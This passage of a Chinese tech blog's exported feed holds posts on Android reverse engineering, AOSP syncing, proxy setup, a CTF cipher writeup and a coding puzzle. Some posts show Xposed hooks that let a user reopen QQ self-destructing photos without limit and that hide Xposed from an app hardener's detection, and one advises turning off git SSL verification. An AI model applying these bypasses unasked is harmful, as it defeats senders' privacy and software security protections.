<p>PS：此处是为了与正常流程保持一致，其实根据另一个<code>addMessage</code>函数，调用<code>BaseQQMessage.a(MessageRecord,String)</code>也是可以的。</p>
<h2 id="无限打开闪照"><a href="#无限打开闪照" class="headerlink" title="无限打开闪照"></a>无限打开闪照</h2><p>定位到关键类<code>com.tencent.mobileqq.pic.api.impl.PicFlashImpl</code><br>有以下两个函数：<code>isFlashPicMsg</code>(判断消息是否为闪照)、<code>isFlashPicMsgReaded</code>(判断闪照是否已读)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span>  <span class="comment">// com.tencent.mobileqq.pic.api.IPicFlash</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFlashPicMsg</span><span class="params">(MessageRecord arg1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> FlashPicHelper.a(arg1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span>  <span class="comment">// com.tencent.mobileqq.pic.api.IPicFlash</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFlashPicMsgReaded</span><span class="params">(MessageRecord arg1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> FlashPicHelper.b(arg1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hook前者，固定返回false，可实现闪照作为图片打开。<br>hook后者，固定返回false，可实现无限打开闪照。</p>
<p>考虑到实际使用时，需要判断发送的图片是否为闪照，选择hook后者(<code>FlashPicHelper.b</code>)。</p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>基于aosp-lastest.tar同步AOSP源码</title>
    <url>/2021/10/05/repo-init-with-aosp-latest/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>使用TUNA AOSP初始包(<code>aosp-lastest.tar</code>)同步AOSP最新源码。</p>
<span id="more"></span>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="Repo"><a href="#Repo" class="headerlink" title="Repo"></a>Repo</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo -o repo</span><br><span class="line">chmod +x repo</span><br><span class="line">sudo mv repo /usr/local/bin/</span><br><span class="line">export REPO_URL=&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="下载、校验、解压"><a href="#下载、校验、解压" class="headerlink" title="下载、校验、解压"></a>下载、校验、解压</h3><p>下载<a href="https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar">aosp-latest.tar</a>后,<code>md5sum aosp-latest.tar</code>计算并对比校验和，无误则执行<code>tar xf aosp-latest.tar</code>解压</p>
<h3 id="设置分支（可选）"><a href="#设置分支（可选）" class="headerlink" title="设置分支（可选）"></a>设置分支（可选）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-12.0.0_r2</span><br></pre></td></tr></table></figure>
<p>不设置则默认下载主分支源码</p>
<h3 id="同步源码"><a href="#同步源码" class="headerlink" title="同步源码"></a>同步源码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">repo sync -j4</span><br></pre></td></tr></table></figure>
<blockquote>
<p>此后，每次只需运行<code>repo sync</code>即可保持同步。 我们强烈建议您保持每天同步，并尽量选择凌晨等低峰时间</p>
</blockquote>
<h4 id="使用Local-Manifests克隆设备代码"><a href="#使用Local-Manifests克隆设备代码" class="headerlink" title="使用Local Manifests克隆设备代码"></a>使用Local Manifests克隆设备代码</h4><p>打开<code>.repo/manifests/default.xml</code>，增加以下内容（已有则不需要添加）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;remote  name=&quot;github&quot;</span><br><span class="line">           fetch=&quot;https://github.com/&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>创建<code>.repo/local_manifests/hammerhead.xml</code>（使用<code>revision</code>指定版本）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;manifest&gt;</span><br><span class="line">  &lt;project name=&quot;z3DD3r/android_device_lge_hammerhead&quot; revision=&quot;lineage-18.1&quot; path=&quot;device/lge/hammerhead&quot; remote=&quot;github&quot; /&gt;</span><br><span class="line">  &lt;project name=&quot;z3DD3r/android_kernel_lge_hammerhead&quot; revision=&quot;lineage-18.1&quot; path=&quot;kernel/lge/hammerhead&quot; remote=&quot;github&quot; /&gt;</span><br><span class="line">  &lt;project name=&quot;z3DD3r/android_vendor_lge&quot; revision=&quot;lineage-18.1&quot; path=&quot;vendor/lge&quot; remote=&quot;github&quot; /&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>

<p>之后<code>repo sync -c -j4 --force-sync</code>即可</p>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="error-RPC-failed-curl-56-GnuTLS-recv-error-9"><a href="#error-RPC-failed-curl-56-GnuTLS-recv-error-9" class="headerlink" title="error: RPC failed; curl 56 GnuTLS recv error (-9)"></a>error: RPC failed; curl 56 GnuTLS recv error (-9)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install gnutls-bin</span><br><span class="line">git config --global http.sslVerify false</span><br><span class="line">git config --global http.postBuffer 1048576000</span><br></pre></td></tr></table></figure>
<p>关闭SSL校验，并设置缓冲区大小</p>
<h3 id="curl-56-GnuTLS-recv-error-110-The-TLS-connection-was-non-properly-terminated"><a href="#curl-56-GnuTLS-recv-error-110-The-TLS-connection-was-non-properly-terminated" class="headerlink" title="curl 56 GnuTLS recv error (-110): The TLS connection was non-properly terminated."></a>curl 56 GnuTLS recv error (-110): The TLS connection was non-properly terminated.</h3><p><code>gnutls_handshake</code>错误，建议取消代理后再同步代码</p>
<p>也可以使用<code>openssl</code>代替<code>gnutls</code>，重新编译git（未测试）<br>详见<a href="https://blog.csdn.net/FJDJFKDJFKDJFKD/article/details/92636451">error RPC failed; curl 56 GnuTLS recv error (-110) The TLS connection was non-properly terminated</a></p>
<p>如果编译时提示依赖未安装，<code>sudo apt install</code>安装依赖即可</p>
<h3 id="fatal-Could-not-reset-index-file-to-revision"><a href="#fatal-Could-not-reset-index-file-to-revision" class="headerlink" title="fatal: Could not reset index file to revision"></a>fatal: Could not reset index file to revision</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">warning: repo is not tracking a remote branch, so it will not receive updates</span><br><span class="line">repo reset: error: Entry &#x27;git_superproject.py&#x27; not uptodate. Cannot merge.</span><br><span class="line">fatal: Could not reset index file to revision &#x27;vx.x.x^0&#x27;</span><br></pre></td></tr></table></figure>
<p>解决：</p>
<blockquote>
<p>cd 到.repo/repo<br>git reset –hard 倒数第二个commit<br>git pull<br>最后再repo sync</p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/6fed8af8d11e">Android 8.1.0 AOSP源码下载及编译</a><br><a href="https://www.it610.com/article/1289249767666294784.htm">解决git clone 完成后提示’error: RPC failed; curl 56 GnuTLS recv error (-9)’</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>在Linux下设置代理（docker、git、repo、wget等）</title>
    <url>/2021/10/03/set-proxy-of-docker-git-and-others/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>记录一下<code>Docker</code>、<code>Git</code>和其他命令（如<code>repo</code>）的代理配置。</p>
<span id="more"></span>

<h2 id="Docker-版本-gt-17-07"><a href="#Docker-版本-gt-17-07" class="headerlink" title="Docker (版本&gt;=17.07)"></a>Docker (版本&gt;=17.07)</h2><h3 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h3><p>打开<code>~/.docker/config.json</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;proxies&quot;:</span><br><span class="line"> &#123;</span><br><span class="line">   &quot;default&quot;:</span><br><span class="line">   &#123;</span><br><span class="line">     &quot;httpProxy&quot;: &quot;http://localhost:8080&quot;,</span><br><span class="line">     &quot;httpsProxy&quot;: &quot;http://localhost:8080&quot;,</span><br><span class="line">     &quot;noProxy&quot;: &quot;localhost,127.0.0.1&quot;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行<code>docker run</code>和<code>docker build</code>时增加<code>--network=host</code>参数</p>
<p>注意：apt只支持http代理</p>
<h3 id="取消"><a href="#取消" class="headerlink" title="取消"></a>取消</h3><p>删除配置即可</p>
<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><h3 id="设置-1"><a href="#设置-1" class="headerlink" title="设置"></a>设置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PROXY_URL=http://localhost:8080</span><br><span class="line">git config --global http.proxy $PROXY_URL</span><br><span class="line">git config --global https.proxy $PROXY_URL</span><br></pre></td></tr></table></figure>
<h3 id="取消-1"><a href="#取消-1" class="headerlink" title="取消"></a>取消</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset PROXY_URL</span><br><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><code>repo</code> <code>wget</code> <code>curl</code>等</p>
<h3 id="设置-2"><a href="#设置-2" class="headerlink" title="设置"></a>设置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PROXY_URL=http://localhost:8080</span><br><span class="line">export https_proxy=$PROXY_URL</span><br><span class="line">export http_proxy=$PROXY_URL</span><br></pre></td></tr></table></figure>
<p>查询ip地址，检测代理是否连接成功：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl cip.cc</span><br></pre></td></tr></table></figure>
<h3 id="取消-2"><a href="#取消-2" class="headerlink" title="取消"></a>取消</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset PROXY_URL</span><br><span class="line">unset https_proxy</span><br><span class="line">unset http_proxy</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>经验</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux设置默认Python版本</title>
    <url>/2020/09/19/set-python-version-in-linux/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>由于默认的python版本为2.7，执行命令时需要改为python3，比较麻烦。所以将python3设置为默认版本。(执行<code>apt-get install python3-pip</code>安装python3)</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>原理：使用update-alternatives进行配置</p>
<h3 id="查看python位置"><a href="#查看python位置" class="headerlink" title="查看python位置"></a>查看python位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /usr/bin/python*</span><br></pre></td></tr></table></figure>
<p>一般是<code>/usr/bin/python2</code>和<code>/usr/bin/python3</code></p>
<h3 id="查询当前配置"><a href="#查询当前配置" class="headerlink" title="查询当前配置"></a>查询当前配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-alternatives --list python</span><br></pre></td></tr></table></figure>
<p>没有配置过的话会返回<code>update-alternatives: error: no alternatives for python</code></p>
<h3 id="配置默认版本"><a href="#配置默认版本" class="headerlink" title="配置默认版本"></a>配置默认版本</h3><p>通过设置优先级来实现默认使用python3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2 1</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 2</span><br></pre></td></tr></table></figure>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>查询默认版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python --version</span><br></pre></td></tr></table></figure>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>有些脚本需要手动修改python版本（如yum），将<code>/usr/bin/python</code>改为<code>/usr/bin/python2</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/fang_chuan/article/details/60958329">更改Ubuntu默认python版本的两种方法</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>第三届上海市大学生网络安全大赛 Classical Writeup</title>
    <url>/2019/01/26/shanghai-3rd-classic/</url>
    <content><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>cipher.txt内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ld hcrakewcfaxr, f hofjjlhfo hlaxuc lj f krau ev hlaxuc kxfk zfj tjui xljkeclhfoor gtk dez xfj vfooud, vec kxu pejk afck, ldke iljtju. Ld hedkcfjk ke peiucd hcrakewcfaxlh foweclkxpj, pejk hofjjlhfo hlaxucj hfd gu acfhklhfoor hepatkui fdi jeoyui gr xfdi. Xezuyuc, OrmkO3vydJCoe2qyNLmcN2qlpJXnM3SxM2Xke3q9 kxur fcu foje tjtfoor yucr jlpaou ke gcufn zlkx peiucd kuhxdeoewr. Kxu kucp ldhotiuj kxu jlpaou jrjkupj tjui jldhu Wcuun fdi Cepfd klpuj, kxu uofgecfku Cudfljjfdhu hlaxucj, Zecoi Zfc LL hcrakewcfaxr jthx fj kxu Udlwpf pfhxldu fdi guredi. F btlhn gcezd veq mtpa eyuc kxu ofsr iew.</span><br></pre></td></tr></table></figure>
<p>推测是移位的密码，使用<code>WinCrypto</code>分析得到（也可以使用<a href="https://quipqiup.com/">quip</a>在线分析并修复）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In cryptography, a classical cipher is a type of cipher that was used historically but now has fallen, for the most part, into disuse. In contrast to modern cryptographic algorithms, most classical ciphers can be practically computed and solved by hand. However, LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9 they are also usually very simple to break with modern technology. The term includes the simple systems used since Greek and Roman times, the elaborate Renaissance ciphers, World War II cryptography such as the Enigma machine and beyond. A quick brown fox jump over the lazy dog.</span><br></pre></td></tr></table></figure>
<p>发现该句子其实来源于英文维基百科的经典加密（Classical cipher）<br>发现最后一句话其实就是<code>A quick brown fox jumps over the lazy dog.</code><br>（包含26个字母的最短句子）并去掉s<br>由此可以得到对照表然后恢复（当然使用<code>WinCrypto</code>就直接是这个字符串了）<br>所以可以得到原本的字符是<code>LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9</code></p>
<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>直接解base64发现行不通<br>移位爆破<br>得到<code>ZmxhZ3tjbGFzc2ljYWxfY2lwaGVyX3NvX2Vhc3l9</code>是可以解的</p>
<h2 id="爆破代码"><a href="#爆破代码" class="headerlink" title="爆破代码"></a>爆破代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toAlpha</span>(<span class="params">c,i</span>):</span></span><br><span class="line">    num = <span class="built_in">ord</span>(c)</span><br><span class="line">    <span class="keyword">if</span> num &gt;= <span class="number">65</span> <span class="keyword">and</span> num &lt;= <span class="number">90</span>:</span><br><span class="line">        num = <span class="number">65</span> + ((num - <span class="number">65</span>) + i) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">elif</span> num &gt;= <span class="number">97</span> <span class="keyword">and</span> num &lt;= <span class="number">122</span>:</span><br><span class="line">        num = <span class="number">97</span> + ((num - <span class="number">97</span>) + i) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">string,i</span>):</span></span><br><span class="line">    string_new = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line">        string_new += <span class="built_in">str</span>(toAlpha(s,i))</span><br><span class="line">    <span class="built_in">print</span>(string_new)</span><br><span class="line">    <span class="keyword">return</span> string_new</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">string</span>):</span></span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">         encrypt(string, -i)</span><br><span class="line">encode = <span class="string">&quot;LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9&quot;</span></span><br><span class="line">decrypt(encode)</span><br></pre></td></tr></table></figure>
<p>在<code>encrypt</code>函数中加上base64解密代码即可爆破</p>
<h3 id="增加代码"><a href="#增加代码" class="headerlink" title="增加代码"></a>增加代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">str</span>(base64.b64decode(string_new))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/Erice_s/article/details/79732499">凯撒密码与python实现</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Xposed绕过某加固的Xposed堆栈检测</title>
    <url>/2021/10/07/shell-xposed-check-bypass/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>更新某营业厅app（版本号<code>7.4.0</code>）后，发现加载<code>Xposed</code>模块会导致app crash。</p>
<p>通过分析<code>Tombstone</code>日志找到检测点，编写<code>Xposed</code>模块绕过堆栈检测。</p>
<span id="more"></span>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>过滤<code>Error</code>级别的日志，得到以下信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A/libc: Fatal signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x78c in tid 20120 (c10086.activity), pid 20120 (c10086.activity)</span><br><span class="line">A/DEBUG: pid: 20120, tid: 20120, name: c10086.activity  &gt;&gt;&gt; com.greenpoint.android.mc10086.activity &lt;&lt;&lt;</span><br><span class="line">A/DEBUG: uid: 10480</span><br><span class="line">A/DEBUG: signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x78c</span><br><span class="line">A/DEBUG: Cause: null pointer dereference</span><br><span class="line">A/DEBUG:     r0  00000000  r1  ffb273e6  r2  0000078c  r3  b6a287de</span><br><span class="line">A/DEBUG:     r4  c6049d88  r5  00000000  r6  00000000  r7  c6049d88</span><br><span class="line">A/DEBUG:     r8  b6a287de  r9  0000078c  r10 f72255a0  r11 ffb284d0</span><br><span class="line">A/DEBUG:     ip  f4c7d0a4  sp  00000000  lr  00000000  pc  0000078c</span><br><span class="line">A/DEBUG: backtrace:</span><br><span class="line">A/DEBUG:       #00 pc 0000078c  &lt;unknown&gt;</span><br><span class="line">A/DEBUG:       #01 pc 00000000  &lt;unknown&gt;</span><br><span class="line">E/tombstoned: Tombstone written to: /data/tombstones/tombstone_18</span><br></pre></td></tr></table></figure>
<p>导出<code>/data/tombstones/tombstone_18</code>到电脑，查看内存（方法栈）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memory near r1 ([stack]):</span><br><span class="line">    ffb273c4 00000305 00000017 000002f1 00000581  ................</span><br><span class="line">    ffb273d4 f4c8125c 00000000 00000000 736f7078  \...........xpos</span><br><span class="line">    ffb273e4 1d006465 00000000 43746567 7373616c  ed......getClass</span><br><span class="line">    ffb273f4 656d614e 0000e400 72727563 54746e65  Name....currentT</span><br><span class="line">    ffb27404 61657268 00f00064 53746567 6b636174  hread...getStack</span><br><span class="line">    ffb27414 63617254 00000065 6176616a 6e616c2f  Trace...java/lan</span><br><span class="line">    ffb27424 68542f67 64616572 0000f200 6a4c2928  g/Thread....()Lj</span><br><span class="line">    ffb27434 2f617661 676e616c 7268542f 3b646165  ava/lang/Thread;</span><br><span class="line">    ffb27444 00009d00 6a4c2928 2f617661 676e616c  ....()Ljava/lang</span><br><span class="line">    ffb27454 7274532f 3b676e69 00004100 6176616a  /String;.A..java</span><br><span class="line">    ffb27464 6e616c2f 74532f67 546b6361 65636172  /lang/StackTrace</span><br><span class="line">    ffb27474 6d656c45 00746e65 000000ef 4c5b2928  Element.....()[L</span><br><span class="line">    ffb27484 6176616a 6e616c2f 74532f67 546b6361  java/lang/StackT</span><br><span class="line">    ffb27494 65636172 6d656c45 3b746e65 00005100  raceElement;.Q..</span><br><span class="line">    ffb274a4 14765802 00000000 c6049d88 f4c8125c  .Xv.........\...</span><br><span class="line">    ffb274b4 00000000 f72255a0 c6001aa5 31362f64  .....U&quot;.....d/61</span><br></pre></td></tr></table></figure>

<p>首先通过<code>java.lang.Thread.currentThread</code>获得当前线程对象，然后调用<code>getStackTrace</code>获得<code>StackTraceElement</code>数组，遍历该数组，调用<code>getClassName</code>，判断是否包含<code>xposed</code></p>
<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><p><code>Xposed</code>Hook<code>Thread.getStackTrace</code>，打印调用栈（函数返回值）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">findAndHookMethod(Thread.class, <span class="string">&quot;getStackTrace&quot;</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        StackTraceElement[] st = (StackTraceElement[]) param.getResult();</span><br><span class="line">        String sts = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement ste : st) &#123;</span><br><span class="line">            sts += ste.toString() + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.e(<span class="string">&quot;StackTrace&quot;</span>, sts);</span><br><span class="line">        <span class="keyword">super</span>.afterHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>（如果要Hook<code>StackTraceElement.getClassName</code>，打印返回值即可）</p>
<p>日志如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dalvik.system.VMStack.getThreadStackTrace(Native Method)</span><br><span class="line">java.lang.Thread.getStackTrace(Thread.java:1736)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">de.robv.android.xposed.LspHooker.handleHookedMethod(Unknown Source:107)</span><br><span class="line">LspHooker_.getStackTrace(Unknown Source:8)</span><br><span class="line">java.lang.Runtime.nativeLoad(Native Method)</span><br><span class="line">java.lang.Runtime.nativeLoad(Runtime.java:1131)</span><br><span class="line">java.lang.Runtime.loadLibrary0(Runtime.java:1085)</span><br><span class="line">java.lang.Runtime.loadLibrary0(Runtime.java:1008)</span><br><span class="line">java.lang.System.loadLibrary(System.java:1664)</span><br><span class="line">com.secneo.apkwrapper.AW.attachBaseContext(Unknown Source:17)</span><br></pre></td></tr></table></figure>
<p>可以看到调用者是<code>java.lang.Runtime.nativeLoad</code>，即so加载时调用（在<code>Native</code>层通过<code>JNI</code>调用<code>getStackTrace</code>）</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用<code>JEB</code>反编译<code>classes.dex</code>，定位到<code>com.secneo.apkwrapper.AW.attachBaseContext</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span>  <span class="comment">// android.content.ContextWrapper</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">attachBaseContext</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    AW.mC = context;</span><br><span class="line">    System.loadLibrary(<span class="string">&quot;DexHelper&quot;</span>);</span><br><span class="line">    H.i();</span><br><span class="line">    AW.ᵢ = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">super</span>.attachBaseContext(context);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到加载的是<code>libDexHelper.so</code>（旧版本是在<code>&lt;clinit&gt;</code>加载，现在改到<code>attachBaseContext</code>了）</p>
<p>由so的加载流程可知，检测函数的调用要么是在<code>JNI_OnLoad</code>，要么是在<code>.init</code>或<code>.init_array</code>段</p>
<p>使用<code>IDA</code>动态调试，发现该加固是在<code>JNI_OnLoad</code>中调用检测函数（并非本文重点，就不详细介绍了）</p>
<p>由于最终还是要调用<code>Java</code>层的<code>getClassName</code>方法，考虑到通用性，决定编写<code>Xposed</code>模块，绕过堆栈检测</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p><code>Xposed</code>Hook<code>StackTraceElement.getClassName</code>方法，判断是否包含<code>xposed</code>，如果包含则替换返回值为<code>android.os.Handler</code></p>
<p>注意：需要在<code>DexHelper</code>加载前Hook</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">findAndHookMethod(StackTraceElement.class, <span class="string">&quot;getClassName&quot;</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        String className = (String) param.getResult();</span><br><span class="line">        <span class="keyword">if</span> (className != <span class="keyword">null</span> &amp;&amp; className.contains(<span class="string">&quot;xposed&quot;</span>)) &#123;</span><br><span class="line">            param.setResult(<span class="string">&quot;android.os.Handler&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">super</span>.afterHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>取石头游戏</title>
    <url>/2020/04/13/stone-game/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>两个足够聪明的人玩轮流取石头的游戏，谁取到最后一个石头谁就赢了，他们一次只能取1个、3个、7个或8个石头，写一程序判断n个石头时先取的人是输还是赢。</p>
<h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>一个整数n，其值不超过10000000。</p>
<h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>如果先取的人赢，请以单独一行输出1，否则输出0。</p>
<h3 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例:"></a>输入样例:</h3><p>这里是3组输入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">10</span><br><span class="line">300</span><br></pre></td></tr></table></figure>
<h3 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="初始解法（内存超限）"><a href="#初始解法（内存超限）" class="headerlink" title="初始解法（内存超限）"></a>初始解法（内存超限）</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxN = <span class="number">10000000</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> V[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">8</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> dp[maxN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; i &gt;= V[j] &amp;&amp; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> v = V[j];</span><br><span class="line">            <span class="keyword">if</span> (i == v)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (dp[i - v] == <span 